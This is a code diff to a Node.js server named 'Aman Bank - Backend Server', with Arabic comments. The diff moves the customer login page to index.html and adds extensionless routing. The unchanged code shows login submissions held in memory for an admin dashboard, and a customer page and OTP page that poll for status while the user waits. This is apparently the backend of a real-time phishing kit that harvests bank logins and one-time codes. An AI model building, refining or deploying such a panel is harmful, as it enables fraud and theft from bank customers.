@@ -2,7 +2,7 @@
 // Aman Bank - Backend Server (no database, no external deps)
 // Run with: node server.js
 // Then open:
-//   http://localhost:3000/bank-app.html   (the customer-facing app)
+//   http://localhost:3000/index.html   (the customer-facing app)
 //   http://localhost:3000/admin.html      (the admin dashboard)
 // ============================================================
 
@@ -55,7 +55,7 @@ function todayKey() {
 }
 
 function serveStatic(req, res, urlPath) {
-  let filePath = urlPath === '/' ? '/bank-app.html' : urlPath;
+  let filePath = urlPath === '/' ? '/index.html' : urlPath;
   filePath = path.join(PUBLIC_DIR, filePath);
 
   // Prevent path traversal outside the public dir
@@ -64,15 +64,31 @@ function serveStatic(req, res, urlPath) {
     return res.end('Forbidden');
   }
 
-  fs.readFile(filePath, (err, content) => {
-    if (err) {
-      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
-      return res.end('404 - الملف غير موجود');
+  function respond(finalPath) {
+    fs.readFile(finalPath, (err, content) => {
+      if (err) {
+        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
+        return res.end('404 - الملف غير موجود');
+      }
+      const ext = path.extname(finalPath).toLowerCase();
+      const mime = { '.html': 'text/html; charset=utf-8', '.js': 'application/javascript', '.css': 'text/css' }[ext] || 'application/octet-stream';
+      res.writeHead(200, { 'Content-Type': mime });
+      res.end(content);
+    });
+  }
+
+  // جرّب المسار كما هو الأول
+  fs.access(filePath, fs.constants.F_OK, (err) => {
+    if (!err) return respond(filePath);
+    // لو مش موجود ومفيهوش امتداد (زي /admin بدل /admin.html)، جرّب إضافة .html
+    if (!path.extname(filePath)) {
+      const withHtml = filePath + '.html';
+      return fs.access(withHtml, fs.constants.F_OK, (err2) => {
+        if (!err2) return respond(withHtml);
+        respond(filePath); // هيرجع 404 بشكل طبيعي
+      });
     }
-    const ext = path.extname(filePath).toLowerCase();
-    const mime = { '.html': 'text/html; charset=utf-8', '.js': 'application/javascript', '.css': 'text/css' }[ext] || 'application/octet-stream';
-    res.writeHead(200, { 'Content-Type': mime });
-    res.end(content);
+    respond(filePath); // هيرجع 404 بشكل طبيعي
   });
 }
 
@@ -83,7 +99,7 @@ const server = http.createServer(async (req, res) => {
   const pathname = urlObj.pathname;
 
   try {
-    // ---- API: receive a login submission from bank-app.html ----
+    // ---- API: receive a login submission from index.html ----
     if (method === 'POST' && pathname === '/api/login') {
       const body = await readBody(req);
       const entry = {
@@ -117,7 +133,7 @@ const server = http.createServer(async (req, res) => {
       return sendJSON(res, 200, { ok: true, requests });
     }
 
-    // ---- API: check a single request's status (used by bank-app.html / otp.html while waiting) ----
+    // ---- API: check a single request's status (used by index.html / otp.html while waiting) ----
     if (method === 'GET' && pathname.startsWith('/api/status/')) {
       const idStr = pathname.split('/')[3];
       const entry = requests.find((r) => r.id === Number(idStr));
@@ -138,7 +154,7 @@ const server = http.createServer(async (req, res) => {
       return sendJSON(res, 200, { ok: true });
     }
 
-    // ---- API: heartbeat from an open bank-app.html tab (for live visitor count) ----
+    // ---- API: heartbeat from an open index.html tab (for live visitor count) ----
     if (method === 'POST' && pathname === '/api/heartbeat') {
       const body = await readBody(req);
       const sessionId = (body.sessionId || '').toString().slice(0, 100);
@@ -164,7 +180,7 @@ const server = http.createServer(async (req, res) => {
       return sendJSON(res, 200, { ok: true, today: todayCount, total: requests.length });
     }
 
-    // ---- Fallback: serve static files (bank-app.html, admin.html) ----
+    // ---- Fallback: serve static files (index.html, admin.html) ----
     if (method === 'GET') {
       return serveStatic(req, res, pathname);
     }
@@ -179,6 +195,6 @@ const server = http.createServer(async (req, res) => {
 
 server.listen(PORT, () => {
   console.log(`✔ الخادم شغال على http://localhost:${PORT}`);
-  console.log(`  - صفحة العميل: http://localhost:${PORT}/bank-app.html`);
+  console.log(`  - صفحة العميل: http://localhost:${PORT}/index.html`);
   console.log(`  - لوحة الإدارة: http://localhost:${PORT}/admin.html`);
 });
